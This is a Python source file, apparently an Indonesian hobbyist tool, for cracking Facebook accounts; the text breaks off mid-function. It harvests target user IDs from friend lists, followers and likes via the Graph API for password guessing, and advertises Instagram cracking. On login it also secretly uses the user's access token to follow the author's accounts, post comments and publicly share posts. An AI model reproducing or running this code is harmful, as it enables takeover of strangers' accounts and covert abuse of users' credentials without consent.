#coding=utf-8

Massage_Author = ("""

~~> Open Source Code Terms? Subscribe to My Channel & Don't Change Bot Follow! Just Add Bot Follow Only!

~~> Remember This Is Just For Example Project!. If you want to remake code, just remake code it for your practice

~~> If you want permission, permission via instgrm/email/fb 

~~> insgrm : https://www.instagram.com/ngemry7

~~> email : xgansb@gmail.com

~~> fb : https://www.facebook.com/meyrina.setyaningrum

~~> Sorry for the messy coding and lots of bugs :)

""")

Pesan_Author = ("""

~~> Open Source Code Syarat? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambahkan Bot Follow Sajah!

~~> Ingat Ini Hanya Untuk Contoh Project!. Kalo Mau Recode, Recode Ajah Itung² Buat Latihan Lu

~~> Kalo Mau Izin, Izin lewat instgrm/email/fb Ajah

~~> insgrm : https://www.instagram.com/ngemry7

~~> email  : xgansb@gmail.com

~~> fb     : https://www.facebook.com/meyrina.setyaningrum

~~> Maaf klo codinganya berantakan dan banyak bug:)

""")

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote


#### Color Tools ####
if ("linux" in sys.platform.lower()):
    p = "\033[0;37m" # putih
    m = "\033[0;31m" # merah
    h = "\033[0;32m" # hijau
    k = "\033[0;33m" # kuning
    b = "\033[0;34m" # biru
    u = "\033[0;35m" # ungu
    o = "\033[0;36m" # biru muda
else:
    p = "" # putih
    m = "" # merah
    h = "" # hijau
    k = "" # kuning
    b = "" # biru
    u = "" # ungu
    o = "" # biru muda


try:
	import requests
except ImportError:
	_deku_uraraka("\n %s[%s•%s•%s] Module requests belum terinstall"%(p,m,k,p))
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	_deku_uraraka("\n %s[%s•%s•%s] Module bs4 belum terinstall"%(p,m,k,p))
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	_deku_uraraka("\n %s[%s•%s•%s] Module futures belum terinstall"%(p,m,k,p))
	os.system("pip install futures")


host = ("https://mbasic.facebook.com")
def banner():
    print(""" \033[1;37m
  ╭╭━━╮╮┈┈┈╭┓╭┓┈┈┈ 
  ┊┃╭━╯╯┈┈┈┃┗┛┗╮┈┈ [ INFORMASI USER ]
  ┈┃┃╭━━━━━┫╭\033[1;91m▋▋\033[1;37m┃┈┈   User: None
  ┈┃╰┫━╮╱╱╱╱╱╱▼┃┈┈   Versi: 2.5
  ┈╰━┫╱┗━╮╱━╮╰┻┣╮┈   Premium: None
  ┈┈┈╰━━━┻━━┻━━┻┛┈""")

def ingpo_penguna(_user,crot):
    print(""" \033[1;37m
  ╭╭━━╮╮┈┈┈╭┓╭┓┈┈┈ 
  ┊┃╭━╯╯┈┈┈┃┗┛┗╮┈┈ [ INFORMASI USER ]
  ┈┃┃╭━━━━━┫╭\033[1;91m▋▋\033[1;37m┃┈┈   User: %s
  ┈┃╰┫━╮╱╱╱╱╱╱▼┃┈┈   Versi: 2.5
  ┈╰━┫╱┗━╮╱━╮╰┻┣╮┈   Premium: %s
  ┈┈┈╰━━━┻━━┻━━┻┛┈"""%(_user,crot))

id = []
ok = []
cp = []
loop=0
### Special Syntaxx ###
# Ganti? Auto Error! #

_uax_=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
_uan_=('nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+')
_uaa_=('Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
_uao_=('Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
_uas_=('Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]')
_ual_=("Mozilla/5.0 (Linux; Android 9; Lenovo TB-8505F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 YandexSearch/7.90 YandexSearchBrowser/7.90")
_uaad_=("Mozilla/5.0 (Linux; U; Android 4.2.2; id-; ADVAN S3 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 bdbrowser_i18n/3.2.0.3")
_uason_=("Mozilla/5.0 (Linux; Android 4.4.2; Sony Xperia Z3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 bdbrowser/1.9.0.200720")
_pcua_=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.31")
_uavi_=("Mozilla/5.0 (Linux; U; Android 2.3.3; en-ca; HTC-Vivo Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
_uarel_=("Mozilla/5.0 (Linux; Android 10; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.29 Mobile Safari/537.36,gzip(gfe),gzip(gfe) (Chrome Image Compression Service)")
_uain_=("Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36")
_uaap_=("Safari: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36")



urlw=("https://wa.me/+6281567607136")
urll=("https://github.com/Mayura-X/unik-codenighter/blob/main/ahh-memek-araa-enak")
__sys__deku=os.system
_deku_uraraka=print
__in__deku__=input
__req__get__=requests.get
__req__post__=requests.post
__remake__=os.rename
__subrek__ = random.choice(["https://youtube.com/c/orbXDBdbsS","https://youtube.com/channel/UCMlyT-T7FLXopriA9HDbXEQ"])
__youtuber__=__subrek__

###########################


current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

def clear():
    if " linux" in sys.platform.lower():
        __sys__deku("clear")
    elif "win" in sys.platform.lower():
        __sys__deku("cls")
    else:__sys__deku("clear")

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

# (" %s[%s•%s•%s] "%(p,m,k,p))

def logs():
    __sys__deku("clear");banner()
    _deku_uraraka("\n%s [%s01%s] Login token"%(p,k,p));__deku__=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if __deku__ in ["1","01"]:
        log_token()
    else:_deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))

def log_token():
    __sys__deku("clear");banner()
    __tokenn__=__in__deku__("\n %s[%s•%s•%s] Token: "%(p,m,k,p))
    try:
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__tokenn__))
        open("login.txt", "w").write(__tokenn__)
        jalan(" %s[%s•%s•%s] Loading... "%(p,m,k,p))
        deku_chan()
        _deku_uraraka("\n %s[%s•%s•%s] Login berhasil "%(p,m,k,p));time.sleep(1)
        jalan(" %s[%s•%s•%s] Please subscribe my channel"%(p,m,k,p))
        __sys__deku('xdg-open %s'%(__youtuber__))
        menu()
    except KeyError:
        _deku_uraraka("\n %s[%s•%s•%s] Login gagal"%(p,m,k,p));logs()
        #os.system("xdg-open https://youtu.be/qhxw5BVUBlE")
        logs()

##### Bot Followers Kontol! jangan ganti ngentod #####

komtwol = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Bjir BiiDev Femes Cuk Gua Ampe Mrinding", "Tumben Post Bang?", "Gua Pengin Jadi Kek Lu Bang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])


kazutora = random.choice(["gans lu bang :v","oyoyoy lu gila ya?","ebink ngentod :v","masih smp udh bisa ngoding \n #bukanmaen","bang lu umur berapa?","moga lu sukses bang :)","master gua ini mah!","ster ajarin hack hati cewek doang","tutor dapetin cewek bang","gansnya bukanmaen awokawok"])
__komen__ = (komtwol)
__komendua__ = (kazutora)
__post__ = ("3909741969124574")
__postdua__ = ("4134869446611824")
__id__ebink=("100002664282607")
__id__meyrina=("100000419639430")
__id__mieruko=("100027294159255")
__id__tsukasa=("1752684667")
__id__halaman_ngapak_code=("281364506990489")
__id__share1_=("4327142604051173")
__id__share2_=("4134869446611824")
__id__share3_=("4004071876358249")
__id__share4_=("3909741969124574")
__id__hal_share_=("1286644925174353")

def deku_chan():
    global __token__
    try:
        __token__=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__token__))
    except requests.exceptions.ConnectionError:
        _deku_uraraka("\n %s[%s•%s•%s] Tidak ada jaringan"%(p,m,k,p));os.sys.exit()
    try:
        __token__=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__token__))
    except IOError:
        _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
    __req__post__('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(__post__,__komen__,__token__))
    __req__post__('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(__postdua__,__komendua__,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__ebink,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__meyrina,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__mieruko,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__tsukasa,__token__))
    __req__post__('https://graph.facebook.com/%s/subscribers?access_token=%s'%(__id__halaman_ngapak_code,__token__))
    __req__get__('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(__id__share1_)+'&access_token='+str(__token__))
    __req__get__('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(__id__share2_)+'&access_token='+str(__token__))
    __req__get__('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(__id__share3_)+'&access_token='+str(__token__))
    __req__get__('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(__id__share4_)+'&access_token='+str(__token__))
    __req__get__('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(__id__hal_share_)+'&access_token='+str(__token__))

def menu():
    global __token__
    try:
        __token__=open("login.txt","r").read()
        __ahhh__ = __req__get__("https://graph.facebook.com/me?access_token=%s"%(__token__))
        __jeson__=json.loads(__ahhh__.text)
        _user=__jeson__['first_name']
    except (KeyError,IOError):
        _deku_uraraka("\n %s[%s•%s•%s] Token kadaluwarsa!"%(p,m,k,p));__sys__deku("rm -rf login.txt");time.sleep(1);logs()
    try:
        su=open("lisenc.log","r").read()
        _suc=__req__get__(urll).text.strip()
        if su in _suc:
            kontol=("premium")
            open("dekura.txt","w").write(kontol)
        else:
            jembud=("not premium");__sys__deku("rm -rf url.txt")
            open("dekura.txt","w").write(jembud)
    except IOError:
        su=open("dekura.txt","w").write("not premium");__sys__deku("rm -rf url.txt")
    try:
        su=open("dekura.txt","r").read()
        if su == "premium":
            open("url.txt","w").write("https://www.github.com/Dekura-X")
        else:__sys__deku("rm -rf lisenc.log");__sys__deku("rm -rf url.txt")
    except IOError:
        __sys__deku("rm -rf lisenc.log")
        __sys__deku("rm -rf url.txt")
    try:
        su=open("dekura.txt","r").read()
        _suc=("premium")
        if su in _suc:
            kontol=("")
        else:
            kontol=(" %s[ %sPremium%s ]"%(p,h,p))
    except IOError:
        __sys__deku("rm -rf lisenc.log");__sys__deku("rm -rf url.txt")
    try:
        ingpone=open("dekura.txt","r").read()
        _succ=("premium")
        if ingpone in _succ:
            crot=("ya")
        else:
            crot=("tidak")
    except IOError:
        __sys__deku("rm -rf lisenc.log");__sys__deku("rm -rf url.txt")
    __sys__deku("clear");ingpo_penguna(_user,crot)
    _deku_uraraka("\n%s [%s01%s] Crack id dari daftar teman sendiri"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Crack id dari daftar teman publik"%(p,k,p))
    _deku_uraraka("%s [%s03%s] Crack id dari follower"%(p,k,p))
    _deku_uraraka("%s [%s04%s] Crack id dari likes"%(p,k,p))
    _deku_uraraka("%s [%s05%s] Crack akun instagram%s"%(p,k,p,kontol))
    _deku_uraraka("%s [%s06%s] Crack lebih dari 10Rb+ id%s"%(p,k,p,kontol))
    _deku_uraraka("%s [%s07%s] Ambil id lewat username facebook%s"%(p,k,p,kontol))
    #_deku_uraraka("%s [%s000%s] Crack id dari list teman publik via username%s"%(p,k,p,kontol))
    _deku_uraraka("%s [%s08%s] Ganti useragent crack"%(p,k,p))
    _deku_uraraka("%s [%s09%s] Check opsi akun fb checkpoint%s"%(p,k,p,kontol))
    _deku_uraraka("%s [%s10%s] Check hasil crack  [ ok - cp ]"%(p,k,p))
    _deku_uraraka("%s [%s99%s] Beli versi premium"%(p,k,p))
    _deku_uraraka("%s [%s00%s] Logout dari fb"%(p,k,p))
    _deku_=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    try:
        su=open("url.txt","r").read()
        _suu=su
        _key=_suu[24]+_suu[17]+_suu[13]+_suu[28]+_suu[9]+_suu[19]
        key="ebiawc"
        if _key in key:
            if _deku_ in ["1","01"]:
                listteman()
            elif _deku_ in ["2","02"]:
                publik()
            elif _deku_ in ["3","03"]:
                followerss()
            elif _deku_ in ["4","04"]:
                likess()
            elif _deku_ in ["5","05"]:
                __sys__deku("bash install.sh")
            elif _deku_ in ["6","06"]:
                massal()
            elif _deku_ in ["7","07"]:
                checkusername()
            elif _deku_ in ["8","08"]:
                userset()
            elif _deku_ in ["9","09"]:
                cek_hasil()
            elif _deku_ in ["10"]:
                cek_results()
            elif _deku_ in ["99"]:
               _deku_uraraka("\n %s[%s•%s•%s] Maaf anda tidak bisa mengakses menu ini"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Karena anda sudah premium"%(p,m,k,p));exit()
           # elif _deku_ in ["77"]:
          #      massal()
            elif _deku_ in ["0","00"]:
                __sys__deku("rm -rf login.txt")
            else:_deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))
    except (KeyError,IOError):
            if _deku_ in ["1","01"]:
                listteman()
            elif _deku_ in ["2","02"]:
                publik()
            elif _deku_ in ["3","03"]:
                followerss()
            elif _deku_ in ["4","04"]:
                likess()
            elif _deku_ in ["5","05"]:
                _deku_uraraka("\n %s[%s•%s•%s] Anda belum membeli script ini versi premium"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Mohon beli terlebih dahulu agar bisa menggunkan menu ini!"%(p,m,k,p));exit()
            elif _deku_ in ["6","06"]:
                _deku_uraraka("\n %s[%s•%s•%s] Anda belum membeli script ini versi premium"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Mohon beli terlebih dahulu agar bisa menggunkan menu ini!"%(p,m,k,p));exit()
            elif _deku_ in ["7","07"]:
                _deku_uraraka("\n %s[%s•%s•%s] Anda belum membeli script ini versi premium"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Mohon beli terlebih dahulu agar bisa menggunkan menu ini!"%(p,m,k,p));exit()
            elif _deku_ in ["8","08"]:
                userset()
            elif _deku_ in ["9","09"]:
                _deku_uraraka("\n %s[%s•%s•%s] Anda belum membeli script ini versi premium"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Mohon beli terlebih dahulu agar bisa menggunkan menu ini!"%(p,m,k,p));exit()
            elif _deku_ in ["10"]:
                cek_results()
            elif _deku_ in ["99"]:
                perbayar()
            elif _deku_ in ["0","00"]:
                __sys__deku("rm -rf login.txt")
            else:_deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))


def checkusername():
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    try:
        user =__in__deku__("\n %s[%s•%s•%s] Username target: "%(p,m,k,p))
        if user in ['']:
            _deku_uraraka("\n %s[%s•%s•%s] Username tidak boleh kosong"%(p,m,k,p));os.sys.exit()
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        _deku_uraraka(" %s[%s•%s•%s] ID: %s"%(p,m,k,p,email_.text));exit()
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] %s"%(p,m,k,p,e));os.sys.exit()

def menu_user(a):
    if a in ["1"]:
        _deku_uraraka("\n%s [%s01%s] Crack dari daftar teman sendiri"%(p,k,p))
        _deku_uraraka("%s [%s02%s] Crack dari daftar teman publik"%(p,k,p))
        pil=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
        if pil in ["1","01"]:
            listteman()
        elif pil in ["2","02"]:
            usertarget=__in__deku__("\n %s[%s•%s•%s] User id target: "%(p,m,k,p))
            return publik(usertarget)
        else:
            _deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))
    else:
        _deku_uraraka("\n%s [%s01%s] Crack dari daftar teman sendiri"%(p,k,p))
        _deku_uraraka("%s [%s02%s] Crack dari daftar teman publik"%(p,k,p))
        pil=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
        if pil in ["1","01"]:
            listteman()
        elif pil in ["2","02"]:
            usert=__in__deku__("\n %s[%s•%s•%s] Username target: "%(p,m,k,p))
            return checkcrack(usert)
        else:
            _deku_uraraka("\n %s[%s•%s•%s] Maaf pilihan tidak ada! "%(p,m,k,p))

def checkcrack(usert):
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    try:
        user = usert
        if user in ['']:
            _deku_uraraka("\n %s[%s•%s•%s] Username tidak boleh kosong"%(p,m,k,p));os.sys.exit()
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        usertarget=email_.text
        return publik(usertarget)
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] %s"%(p,m,k,p,e));os.sys.exit()

def massal():
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    try:
        tanya_total = int(__in__deku__("\n %s[%s•%s•%s] Jumlah id: "%(p,m,k,p)))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        _id_=__in__deku__("\n %s[%s•%s•%s] User id target%s: "%(p,m,k,p,t))
        try:
            r= __req__get__("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,_token_))
            z=json.loads(r.text)
            for i in z['friends']['data']:
                uid = i["id"]
                nama = i["name"]
                id.append(uid+"<=>"+nama)
        except KeyError:
            _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    if len(id) == 0:
        _deku_uraraka(" %s[%s•%s•%s] Maaf total id anda adalah %s"%(p,m,k,p,len(id)));exit()
    else:
        _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
        dekura_x()

def listteman():
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    try:
        r= __req__get__("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(_token_))
        z=json.loads(r.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    if len(id) !=0:
        _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
        dekura_x()
    else:_deku_uraraka(" %s[%s•%s•%s] Maaf total id anda adalah %s"%(p,m,k,p,len(id)));exit()

def publik():
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    _id_=__in__deku__("\n %s[%s•%s•%s] User id target: "%(p,m,k,p))
    try:
        r= __req__get__("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,_token_))
        z=json.loads(r.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        _deku_uraraka("\n %s[%s•%s•%s] user tidak ada atau pertemanan di private"%(p,m,k,p));os.sys.exit()
    if len(id) !=0:
        _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
        dekura_x()
    else:_deku_uraraka(" %s[%s•%s•%s] Maaf total id target adalah %s"%(p,m,k,p,len(id)));exit()

def followerss():
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    _id_=__in__deku__("\n %s[%s•%s•%s] User id target: "%(p,m,k,p))
    try:
        for i in __req__get__("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(_id_,_token_)).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    if len(id) !=0:
        _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
        dekura_x()
    else:_deku_uraraka(" %s[%s•%s•%s] Maaf total followers target adalah %s"%(p,m,k,p,len(id)));exit()


def likess():
    try:
        _token_= open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1)
    _id_=__in__deku__("\n %s[%s•%s•%s] User id target: "%(p,m,k,p))
    try:
        for i in __req__get__("https://graph.facebook.com/%s/likes?limit=20000&access_token=%s"%(_id_,_token_)).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
        _deku_uraraka("\n %s[%s•%s•%s] User not found"%(p,m,k,p));os.sys.exit()
    if len(id) !=0:
        _deku_uraraka(" %s[%s•%s•%s] Total id: %s"%(p,m,k,p,len(id)))
        dekura_x()
    else:_deku_uraraka(" %s[%s•%s•%s] Maaf total id post target adalah %s"%(p,m,k,p,len(id)));exit()


def crackfiles():
    _piles_=__in__deku__("\n %s[%s•%s•%s] Masukan files dump id mu\n %s[%s•%s•%s] Files: "%(p,m,k,p,p,m,k,p))
    try:
        open(_piles_,"r").read()
        __remake__(_piles_,"kontol.json")
        _read_=("kontol.json")
        return crack(_read_)
    except Exception as e:
        _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))

def userset():
    _deku_uraraka("\n%s [%s01%s] Ganti useragent sendiri"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Ganti useragent sesuai device mu"%(p,k,p))
    _deku_uraraka("%s [%s03%s] Cek useragent sekarang"%(p,k,p))
    _deku_uraraka("%s [%s00%s] Back/kembali"%(p,k,p))
    _pil_=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if _pil_ in ["1","01"]:
        _userr=__in__deku__("\n %s[%s•%s•%s] Masukan useragent mu\n %s[%s•%s•%s] Useragent: "%(p,m,k,p,p,m,k,p))
        try:
            open("ua","w").write(_userr)
            usera=open("ua","r").read()
        except Exception as e:
            _deku_uraraka("\n %s[%s•%s•%s] Error: %s"%(p,m,k,p,e))
        if usera == _userr:
            _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
        else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
    elif _pil_ in ["2","02"]: 
        _deku_uraraka("\n %s [%s Select useragent device %s]%s"%(b,p,b,p))
        _deku_uraraka("\n%s [%s01%s] Useragent nokia"%(p,k,p))
        _deku_uraraka("%s [%s02%s] Useragent xiaomy"%(p,k,p))
        _deku_uraraka("%s [%s03%s] Useragent asus"%(p,k,p))
        _deku_uraraka("%s [%s04%s] Useragent samsung"%(p,k,p))
        _deku_uraraka("%s [%s05%s] Useragent oppo"%(p,k,p))
        _deku_uraraka("%s [%s06%s] Useragent vivo"%(p,k,p))
        _deku_uraraka("%s [%s07%s] Useragent lenovo"%(p,k,p))
        _deku_uraraka("%s [%s08%s] Useragent advan"%(p,k,p))
        _deku_uraraka("%s [%s09%s] Useragent sony"%(p,k,p))
        _deku_uraraka("%s [%s10%s] Useragent realme"%(p,k,p))
        _deku_uraraka("%s [%s11%s] Useragent iphone"%(p,k,p))
        _deku_uraraka("%s [%s12%s] Useragent huawei"%(p,k,p))
        _deku_uraraka("%s [%s13%s] Useragent infinix"%(p,k,p))
        _deku_uraraka("%s [%s14%s] Useragent apple"%(p,k,p))
        _deku_uraraka("%s [%s15%s] Useragent pc"%(p,k,p))
        _pilua=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p,))
        if _pilua in ["1","01"]:
            open("ua","w").write(_uan_)
            _xec=open("ua","r").read()
            if _xec == _uan_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["2","02"]:
            open("ua","w").write(_uax_)
            _xec=open("ua","r").read()
            if _xec == _uax_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["3","03"]:
            open("ua","w").write(_uaa_)
            _xec=open("ua","r").read()
            if _xec == _uaa_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["4","04"]:
            open("ua","w").write(_uas_)
            _xec=open("ua","r").read()
            if _xec == _uas_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["5","05"]:
            open("ua","w").write(_uao_)
            _xec=open("ua","r").read()
            if _xec == _uao_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["6","06"]:
            open("ua","w").write(_uavi_)
            _xec=open("ua","r").read()
            if _xec == _uavi_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["7","07"]:
            open("ua","w").write(_ual_)
            _xec=open("ua","r").read()
            if _xec == _ual_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["8","08"]:
            open("ua","w").write(_uaad_)
            _xec=open("ua","r").read()
            if _xec == _uaad_:
